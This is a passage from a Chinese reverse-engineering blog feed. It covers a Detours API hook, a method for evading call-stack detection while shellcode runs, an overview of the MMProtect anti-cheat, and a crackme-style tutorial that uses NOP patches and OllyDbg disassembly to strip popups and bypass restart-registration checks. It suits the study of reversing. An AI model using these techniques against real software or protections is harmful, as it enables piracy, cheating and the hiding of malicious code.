class=\"line\">\tDetourAttach(&amp;(PVOID&amp;)fnLoadLibraryA, MyLoadLibraryA);</span><br><span class=\"line\">\tDetourTransactionCommit();</span><br><span class=\"line\">\treturn TRUE;  // 除非将焦点设置到控件，否则返回 TRUE</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"dll-隐藏\"><a class=\"markdownIt-Anchor\" href=\"#dll-隐藏\">#</a> DLL 隐藏</h3>\n<h3 id=\"基于调用栈及call检测方法一\"><a class=\"markdownIt-Anchor\" href=\"#基于调用栈及call检测方法一\">#</a> 基于调用栈及 CALL 检测方法（一）</h3>\n<ol>\n<li>\n<p>原理</p>\n<p>函数调用 CALL 指令可拆分为两步操作：</p>\n<p>1)、将调用者的下一条指令（EIP）的地址压栈</p>\n<p>2)、跳转至将要调用的函数地址中（相对偏移或绝对地址）</p>\n<p>那么在执行到子函数首地址位置时，返回地址（即调用函数中调用位置下一条指令的地址）就已经存在于堆栈中了，并且是 ESP 指向地址的值。下面通过栈帧的概念，了解编译器在接下来对堆栈进行的操作。</p>\n<p>简言之，栈帧就是利用 EBP（栈帧指针，请注意不是 ESP）寄存器访问栈内部局部变量、参数、函数返回地址等的手段。程序运行中，ESP 寄存器的值随时变化，访问栈中函数的局部变量、参数时，若以 ESP 值为基准编写程序会十分困难，并且也很难使 CPU 引用到正确的地址。</p>\n<p>所以，调用某函数时，先要把用作基准点（函数起始地址）的 ESP 值保存到 EBP，并维持在函数内部。这样，无论 ESP 的值如何变化，以 EBP 的值为基准能够安全访问到相关函数的局部变量、参数、返回地址，这就是 EBP 寄存器作为栈帧指针的作用。</p>\n<p>在函数体代码的任何位置，EBP 寄存器指向的地址始终存储属于它的调用函数的 EBP 的值，根据这个原理可逐级向调用函数、调用函数的调用函数进行遍历，向上回溯。</p>\n<p>这样有什么用呢？在将属于调用函数的 EBP 的值压栈之前，ESP 指向的地址存储的是由 CALL 指令压栈的调用函数中调用位置的下一条指令的地址（原 EIP）。那么根据这个逻辑，可以通过上面回溯的各级 EBP 的值，并根据 EBP+sizeof (ULONG_PTR) 获取到函数调用者函数体中的地址（当前函数的返回地址）。有了每级调用的函数体中的地址，那么获取该函数的详细信息及函数符号就变得容易了</p>\n<p>2. 对抗思路<br>\n分配内存地址作为基地址的内存空间，并将以当前 ESP 为基地址的一段栈内存片段的数据拷贝到了新分配的内存空间的高内存区域中，修改 ESP 和 EBP 寄存器的值为新缓冲区中对应的两个寄存器指针应该指向的位置，相当于对堆栈片段进行了平移。</p>\n<p>平移时首先根据 ESP 和 EBP 寄存器指向的内存地址定位需要拷贝的数据范围。在这里可能会向 EBP 指向的地址上面多拷贝一部分数据，以将参数和返回地址等数据一并拷贝到新分配的缓冲区中。拷贝完成之后，将 ESP 和 EBP 寄存器指向新缓冲区中对应的位置。</p>\n<p>这时开始程序对堆栈的操作将会在新分配的内存缓冲区中进行。在 ShellCode 代码执行即将完成时，应会再将 ESP 和 EBP 的值还原回原来真正栈里的地址，避免弹栈时进入上面未知的内存区域导致程序异常。</p>\n</li>\n<li>\n<p>验证</p>\n</li>\n<li>\n<p>为了验证这个判断是否有效和真实，接下来需要实现上面猜想中描述的操作，看看调试器或检测系统是否能够成功地进行栈回溯。</p>\n<p>下面的代码片段实现了分配新的缓冲区，并拷贝从 ESP 指针指向位置到 调用函数的 EBP 在栈中存储位置加上调用函数的返回地址的存储位置这个范围的栈片段，到新分配的缓冲区中最高位置区域，为低内存预留了 0x100000 字节的空间。</p>\n</li>\n</ol>\n<h2 id=\"mmprotect登录器保护介绍与分析一\"><a class=\"markdownIt-Anchor\" href=\"#mmprotect登录器保护介绍与分析一\">#</a> MMProtect 登录器保护介绍与分析（一）</h2>\n<ol>\n<li>\n<p>1. 驱动级外挂拦截</p>\n<p>​        有一定安全经验的人都知道，Ring3 层的防护只是一层窗户纸，一捅即破。MMProtect 采用应用层和内核层双重保护，互相协调工作，检测游戏进程中加载的模块是否包含非法特征码。</p>\n<p>2. 游戏进程防护</p>\n<p>​    一些常用的内存读写及调试工具会对被保护的进程进行诸如打开、读、写操作。MMProtect 保护下的进程，有效禁止这些敏感操作，使得传统调试工具无法对游戏进程进行调试和分析。</p>\n<p>3. 游戏防调试分析</p>\n<p>除了对常规内存操作的防护外，MMProtect 中加入了对应用层调试模型的修改，使得即便外挂作者通过某些手段过掉了常规内存读写限制，依然不能对游戏进程进行调试。更有效保证了游戏进程的安全。</p>\n<p>4. 代码自校验</p>\n<p>​    安全系统本身对系统的修改，不允许以任何方式恢复，MMProtect 内部实现了强大的自校验功能，当 MMProtect 系统的任何一处遭受攻击，都会导致系统及时终止游戏进程或操作系统，有效保证了安全系统自身的安全性。只有在安全系统自身足够安全的情况下，才能为游戏进程提供有效的保护。</p>\n<p>5. 外挂云查杀</p>\n<p>对抗外挂的传统方式是，通过游戏更新的手段使得已发现的外挂失效。加入 MMProtect 系统的游戏，实时连接到云端，对游戏模块进行校验，如发现游戏进程加载了非法模块，第一时间就会报错结束游戏进程。而这一过程，不需要对游戏本身做任何修改和更新。</p>\n<p>6. 高效率</p>\n<p>MMProtect 虽然使用与杀软同样的过滤拦截技术，但其目的明确，校验算法十分高效，可以达到使用 MMProtect 和未使用时效率几乎相同，不会对系统造成卡顿等影响。云查杀在云端校验，不使用本地资源，只需少量的通信即可完成。</p>\n</li>\n</ol>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2023/08/22/%E5%8E%BB%E5%BC%B9%E7%AA%97%E7%BB%BF%E5%8C%96/",
            "url": "http://example.com/2023/08/22/%E5%8E%BB%E5%BC%B9%E7%AA%97%E7%BB%BF%E5%8C%96/",
            "title": "破解相关",
            "date_published": "2023-08-22T05:38:45.000Z",
            "content_html": "<h1 id=\"破解\"><a class=\"markdownIt-Anchor\" href=\"#破解\">#</a> 破解</h1>\n<blockquote>\n<p>PUSHFD 指令把 32 位 EFLAGS 寄存器内容压入堆栈，而 POPFD 指令则把栈顶单元内容弹出到 EFLAGS 寄存器：</p>\n<p>PUSHAD 指令按照 EAX、ECX、EDX、EBX、ESP（执行 PUSHAD 之前的值）、EBP、ESI 和 EDI 的顺序，将所有 32 位通用寄存器压入堆栈</p>\n</blockquote>\n<p>脱壳之后记得 fix res</p>\n<h2 id=\"常用函数\"><a class=\"markdownIt-Anchor\" href=\"#常用函数\">#</a> 常用函数</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">了解Windows API：</span><br><span class=\"line\">//消息框</span><br><span class=\"line\">1.MessageBoxA/W</span><br><span class=\"line\"></span><br><span class=\"line\">//弹网页</span><br><span class=\"line\">2.ShellExecuteA/W</span><br><span class=\"line\">3.WinExec</span><br><span class=\"line\">4.CreateProcessA/W</span><br><span class=\"line\"></span><br><span class=\"line\">5.CreateThread</span><br><span class=\"line\"></span><br><span class=\"line\">//注册表</span><br><span class=\"line\">6.RegCreateKeyExA/W</span><br><span class=\"line\">7.RegOpenKeyExA/W</span><br><span class=\"line\">8.RegDeleteKeyExA/W</span><br><span class=\"line\"></span><br><span class=\"line\">//创建窗口</span><br><span class=\"line\">DialogBox</span><br><span class=\"line\">CreateWindowExA/W</span><br></pre></td></tr></table></figure>\n<h2 id=\"nop-填充\"><a class=\"markdownIt-Anchor\" href=\"#nop-填充\">#</a> nop 填充</h2>\n<p>整条填充 00</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817121220618.png\" alt=\"image-20230817121220618\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817121353324.png\" alt=\"image-20230817121353324\"></p>\n<p>nop 填充 MessageBox</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817131409135.png\" alt=\"image-20230817131409135\"></p>\n<h2 id=\"函数下段\"><a class=\"markdownIt-Anchor\" href=\"#函数下段\">#</a> 函数下段</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//弹网页</span><br><span class=\"line\">2.ShellExecuteA/W</span><br><span class=\"line\">3.WinExec</span><br><span class=\"line\">4.CreateProcessA/W</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817132219720.png\" alt=\"image-20230817132219720\"></p>\n<p>回车第一条转到调用的地方，同时注意有两个参数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817132458596.png\" alt=\"image-20230817132458596\"></p>\n<p>nop 填充</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817132604822.png\" alt=\"image-20230817132604822\"></p>\n<p>一样的方法把调用的地方 nop</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817132710378.png\" alt=\"image-20230817132710378\"></p>\n<h2 id=\"修复改浏览器主页\"><a class=\"markdownIt-Anchor\" href=\"#修复改浏览器主页\">#</a> 修复改浏览器主页</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817133248989.png\" alt=\"image-20230817133248989\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817133306465.png\" alt=\"image-20230817133306465\"></p>\n<p>整个函数都是修改注册表的</p>\n<p>可以在首行 ret，或者一个个 nop</p>\n<h2 id=\"编辑资源\"><a class=\"markdownIt-Anchor\" href=\"#编辑资源\">#</a> 编辑资源</h2>\n<p>使用资源编辑器删除或者设置为不可见</p>\n<p>建议使用工具 resourcehacker 或者 restorator</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817134553253.png\" alt=\"image-20230817134553253\"></p>\n<h2 id=\"查找窗口\"><a class=\"markdownIt-Anchor\" href=\"#查找窗口\">#</a> 查找窗口</h2>\n<p>procexp 查找窗口属于哪个程序</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817135114574.png\" alt=\"image-20230817135114574\"></p>\n<h2 id=\"调用函数过滤\"><a class=\"markdownIt-Anchor\" href=\"#调用函数过滤\">#</a> 调用函数过滤</h2>\n<p>处理窗口</p>\n<p>一样给函数下段</p>\n<p>// 创建窗口<br>\n DialogBox<br>\nCreateWindowExA/W</p>\n<p>如果不知道调用的函数，使用 procmon</p>\n<p>先使用过滤器找到程序名</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817135804780.png\" alt=\"image-20230817135804780\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230817135749844.png\" alt=\"image-20230817135749844\"></p>\n<h2 id=\"编辑资源-2\"><a class=\"markdownIt-Anchor\" href=\"#编辑资源-2\">#</a> 编辑资源</h2>\n<p>1. 资源编辑工具</p>\n<p>2.winapi</p>\n<p>SetDlgItemTextW/A</p>\n<p>DialogBox</p>\n<p>3.16 进制编辑器</p>\n<p>winhex</p>\n<h1 id=\"破解程序重启验证\"><a class=\"markdownIt-Anchor\" href=\"#破解程序重启验证\">#</a> 破解程序重启验证</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">吾爱破解培训第五课：反击作者的挑衅--实战解除程序重启验证</span><br><span class=\"line\"></span><br><span class=\"line\">吾爱破解专用版Ollydbg:http://down.52pojie.cn/Tools/Debuggers/</span><br><span class=\"line\">ProcMon:http://down.52pojie.cn/Tools/Anti_Rootkit/</span><br><span class=\"line\"></span><br><span class=\"line\">题外话:</span><br><span class=\"line\">    编程是逆向的基础,破解只是逆向的一个很小的分支。如果真喜欢逆向,建议好好的去学一下编程,毕竟写软件不容易。</span><br><span class=\"line\"></span><br><span class=\"line\">0xFFFFFFFF:预习</span><br><span class=\"line\">    熟悉OD字符串插件的使用</span><br><span class=\"line\">Ctrl+F搜索字符串</span><br><span class=\"line\"></span><br><span class=\"line\">    熟悉OD如何下断点</span><br><span class=\"line\">Ctrl+G:直接断API</span><br><span class=\"line\">Ctrl+N:输入表断API</span><br><span class=\"line\">利用插件</span><br><span class=\"line\"></span><br><span class=\"line\">    熟悉procmon的使用</span><br><span class=\"line\">可以监控文件，注册表，网络，进线程信息</span><br><span class=\"line\">排除进程:ExClude</span><br><span class=\"line\">查看指定进程:Include</span><br><span class=\"line\"></span><br><span class=\"line\">    熟悉文件操作API的使用</span><br><span class=\"line\">CreateFileA(W):创建文件</span><br><span class=\"line\">ReadFile:读取文件</span><br><span class=\"line\">WriteFile:写入文件</span><br><span class=\"line\">CloseHandle:关闭句柄</span><br><span class=\"line\">读取文件:CreateFile-&gt;ReadFile-&gt;CloseHandle</span><br><span class=\"line\">写入文件:CreateFile-&gt;WriteFile-&gt;CloseHandle</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    熟悉注册表操作API的使用</span><br><span class=\"line\">创建注册表Key:RegCreateKey</span><br><span class=\"line\">打开注册表Key:RegOpenKey</span><br><span class=\"line\">查询注册表键值:RegQueryValue(Ex)</span><br><span class=\"line\">写入注册表键值:RegSetValueEx</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0x0:什么是重启验证</span><br><span class=\"line\">    重启验证顾名思义就是在程序启动时验证注册信息。 </span><br><span class=\"line\"></span><br><span class=\"line\">0x1:执行流程</span><br><span class=\"line\">    基本的执行流程:注册信息输入--&gt;程序重启--&gt;执行验证机制--&gt;正常执行</span><br><span class=\"line\"></span><br><span class=\"line\">    扩展的执行流程:注册信息输入--&gt;执行部分验证机制/执行假验证机制--&gt;程序重启--&gt;执行真验证机制--&gt;正常执行</span><br><span class=\"line\"></span><br><span class=\"line\">    对于有经验的作者来说,可以在注册信息输入和程序重启之间加入假的验证机制,假的验证机制一般比较简单,比如说只是当单纯的明码比较,当我们输入这个假的注册码的,程序一般会提示注册成功,此时程序就会知道我们是逆向者,在程序重启时就会假装注册成功,在执行程序功能时就会报错或是无反应,这就是所谓的暗桩。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0x2:重启验证的类型</span><br><span class=\"line\">    重启验证根据写入信息位置的不同一般分两类,一类是将注册信息写入文件中,一类是将注册信息写入注册表中。</span><br><span class=\"line\"></span><br><span class=\"line\">0x3:定位关键代码</span><br><span class=\"line\">    1.字符串定位</span><br><span class=\"line\">     通过OD字符串插件扫描敏感字符串,一般出现的文件路径或是注册表路径都可能是验证信息的保存位置</span><br><span class=\"line\"></span><br><span class=\"line\">    2.监控工具定位</span><br><span class=\"line\">    通过procmon等监控工具监控注册信息的写入位置</span><br><span class=\"line\"></span><br><span class=\"line\">    3.API定位</span><br><span class=\"line\">    通过定位CreateFile,RegCreateKey等API来获取注册信息的写入位置</span><br><span class=\"line\"></span><br><span class=\"line\">0x4:Demo演示</span><br><span class=\"line\">重启验证1:写入信息进txt:JXU2MjExJXU2</span><br><span class=\"line\">CreateFile-&gt;WriteFile-&gt;ReadFile-&gt;比较算法</span><br><span class=\"line\">重启验证2:写入信息进ini</span><br><span class=\"line\">WritePrivateProfileStringA:写入配置信息</span><br><span class=\"line\">0012F530   00544638  |Section = &quot;验证&quot;</span><br><span class=\"line\">0012F534   00544634  |Key = &quot;Key&quot;</span><br><span class=\"line\">0012F538   001C9578  |String = &quot;987654321&quot;</span><br><span class=\"line\">0012F53C   001D7F70  \\FileName = &quot;C:\\Users\\Administrator\\Desktop\\52Pojie.ini&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GetPrivateProfileStringA:读取配置信息</span><br><span class=\"line\"></span><br><span class=\"line\">NjJGJXU3NTI</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">重启验证3:写入信息进注册表</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4JXU2MjM3</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820115917972.png\" alt=\"image-20230820115917972\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820120137839.png\" alt=\"image-20230820120137839\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820133027331.png\" alt=\"image-20230820133027331\"></p>\n<h3 id=\"写入到txt\"><a class=\"markdownIt-Anchor\" href=\"#写入到txt\">#</a> 写入到 txt</h3>\n<p>1. 在重启验证 1 处下段，关键代码如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004026F0  |.  55                    push    ebp</span><br><span class=\"line\">004026F1  |.  8BEC                  mov     ebp,esp</span><br><span class=\"line\">004026F3  |.  6A FF                 push    -0x1</span><br><span class=\"line\">004026F5  |.  68 68385300           push    00533868</span><br><span class=\"line\">004026FA  |.  64:A1 00000000        mov     eax,dword ptr fs:[0]</span><br><span class=\"line\">00402700  |.  50                    push    eax</span><br><span class=\"line\">00402701  |.  83EC 0C               sub     esp,0xC</span><br><span class=\"line\">00402704  |.  A1 B0275900           mov     eax,dword ptr ds:[0x5927B0]</span><br><span class=\"line\">00402709  |.  33C5                  xor     eax,ebp</span><br><span class=\"line\">0040270B  |.  8945 F0               mov     [local.4],eax</span><br><span class=\"line\">0040270E  |.  56                    push    esi</span><br><span class=\"line\">0040270F  |.  57                    push    edi</span><br><span class=\"line\">00402710  |.  50                    push    eax</span><br><span class=\"line\">00402711  |.  8D45 F4               lea     eax,[local.3]</span><br><span class=\"line\">00402714  |.  64:A3 00000000        mov     dword ptr fs:[0],eax</span><br><span class=\"line\">0040271A  |.  8BF1                  mov     esi,ecx</span><br><span class=\"line\">0040271C  |.  C745 EC 00000000      mov     [local.5],0x0</span><br><span class=\"line\">00402723  |.  E8 75270000           call    00404E9D</span><br><span class=\"line\">00402728  |.  33D2                  xor     edx,edx</span><br><span class=\"line\">0040272A  |.  8BC8                  mov     ecx,eax</span><br><span class=\"line\">0040272C  |.  85C9                  test    ecx,ecx</span><br><span class=\"line\">0040272E  |.  0F95C2                setne   dl</span><br><span class=\"line\">00402731  |.  85D2                  test    edx,edx</span><br><span class=\"line\">00402733  |.  75 0A                 jnz     short 0040273F</span><br><span class=\"line\">00402735  |.  68 05400080           push    0x80004005</span><br><span class=\"line\">0040273A  |.  E8 B1ECFFFF           call    004013F0</span><br><span class=\"line\">0040273F  |&gt;  8B01                  mov     eax,dword ptr ds:[ecx]</span><br><span class=\"line\">00402741  |.  FF50 0C               call    dword ptr ds:[eax+0xC]</span><br><span class=\"line\">00402744  |.  83C0 10               add     eax,0x10</span><br><span class=\"line\">00402747  |.  8945 EC               mov     [local.5],eax</span><br><span class=\"line\">0040274A  |.  8D45 EC               lea     eax,[local.5]</span><br><span class=\"line\">0040274D  |.  50                    push    eax</span><br><span class=\"line\">0040274E  |.  8D8E C8000000         lea     ecx,dword ptr ds:[esi+0xC8]</span><br><span class=\"line\">00402754  |.  C745 FC 00000000      mov     [local.1],0x0</span><br><span class=\"line\">0040275B  |.  E8 C8590100           call    00418128</span><br><span class=\"line\">00402760  |.  8B45 EC               mov     eax,[local.5]                      ;  获取文本框内容</span><br><span class=\"line\">00402763  |.  8378 F4 00            cmp     dword ptr ds:[eax-0xC],0x0</span><br><span class=\"line\">00402767  |.  74 74                 je      short 004027DD</span><br><span class=\"line\">00402769  |.  6A 00                 push    0x0                                ; /hTemplateFile = NULL</span><br><span class=\"line\">0040276B  |.  6A 00                 push    0x0                                ; |Attributes = 0</span><br><span class=\"line\">0040276D  |.  6A 02                 push    0x2                                ; |Mode = CREATE_ALWAYS</span><br><span class=\"line\">0040276F  |.  6A 00                 push    0x0                                ; |pSecurity = NULL</span><br><span class=\"line\">00402771  |.  6A 01                 push    0x1                                ; |ShareMode = FILE_SHARE_READ</span><br><span class=\"line\">00402773  |.  68 00000040           push    0x40000000                         ; |Access = GENERIC_WRITE</span><br><span class=\"line\">00402778  |.  FFB6 BC000000         push    dword ptr ds:[esi+0xBC]            ; |FileName</span><br><span class=\"line\">0040277E  |.  FF15 10345400         call    dword ptr ds:[&lt;&amp;KERNEL32.CreateFil&gt;; \\CreateFileA</span><br><span class=\"line\">00402784  |.  8BF0                  mov     esi,eax</span><br><span class=\"line\">00402786  |.  83FE FF               cmp     esi,-0x1                           ;  文件是否创建</span><br><span class=\"line\">00402789  |.  74 52                 je      short 004027DD</span><br><span class=\"line\">0040278B  |.  8B4D EC               mov     ecx,[local.5]                      ;  ecx就是我们输入的值</span><br><span class=\"line\">0040278E  |.  BA 01000000           mov     edx,0x1</span><br><span class=\"line\">00402793  |.  2B51 FC               sub     edx,dword ptr ds:[ecx-0x4]</span><br><span class=\"line\">00402796  |.  8B41 F8               mov     eax,dword ptr ds:[ecx-0x8]</span><br><span class=\"line\">00402799  |.  0BC2                  or      eax,edx</span><br><span class=\"line\">0040279B  |.  8B79 F4               mov     edi,dword ptr ds:[ecx-0xC]</span><br><span class=\"line\">0040279E  |.  7D 0D                 jge     short 004027AD</span><br><span class=\"line\">004027A0  |.  6A 00                 push    0x0</span><br><span class=\"line\">004027A2  |.  8D4D EC               lea     ecx,[local.5]</span><br><span class=\"line\">004027A5  |.  E8 B6EEFFFF           call    00401660</span><br><span class=\"line\">004027AA  |.  8B4D EC               mov     ecx,[local.5]</span><br><span class=\"line\">004027AD  |&gt;  6A 00                 push    0x0                                ; /pOverlapped = NULL</span><br><span class=\"line\">004027AF  |.  8D45 E8               lea     eax,[local.6]                      ; |</span><br><span class=\"line\">004027B2  |.  50                    push    eax                                ; |pBytesWritten</span><br><span class=\"line\">004027B3  |.  57                    push    edi                                ; |nBytesToWrite</span><br><span class=\"line\">004027B4  |.  51                    push    ecx                                ; |Buffer</span><br><span class=\"line\">004027B5  |.  56                    push    esi                                ; |hFile</span><br><span class=\"line\">004027B6  |.  FF15 2C345400         call    dword ptr ds:[&lt;&amp;KERNEL32.WriteFile&gt;; \\WriteFile</span><br><span class=\"line\">004027BC  |.  85C0                  test    eax,eax</span><br><span class=\"line\">004027BE  |.  74 16                 je      short 004027D6</span><br><span class=\"line\">004027C0  |.  6A 00                 push    0x0</span><br><span class=\"line\">004027C2  |.  6A 00                 push    0x0</span><br><span class=\"line\">004027C4  |.  68 60465400           push    00544660                           ;  你选择的验证类型是重启验证1</span><br><span class=\"line\">004027C9  |.  E8 B17F0000           call    0040A77F                           ;  弹窗</span><br><span class=\"line\">004027CE  |.  6A 00                 push    0x0                                ; /ExitCode = 0x0</span><br><span class=\"line\">004027D0  |.  FF15 40385400         call    dword ptr ds:[&lt;&amp;USER32.PostQuitMes&gt;; \\PostQuitMessage</span><br><span class=\"line\">004027D6  |&gt;  56                    push    esi                                ; /hObject</span><br><span class=\"line\">004027D7  |.  FF15 24345400         call    dword ptr ds:[&lt;&amp;KERNEL32.CloseHand&gt;; \\CloseHandle</span><br></pre></td></tr></table></figure>\n<p>执行完写文件程序会自动退出</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821215838073.png\" alt=\"image-20230821215838073\"></p>\n<p>2. 重新载入程序，在 txt 处下段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821215937761.png\" alt=\"image-20230821215937761\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span 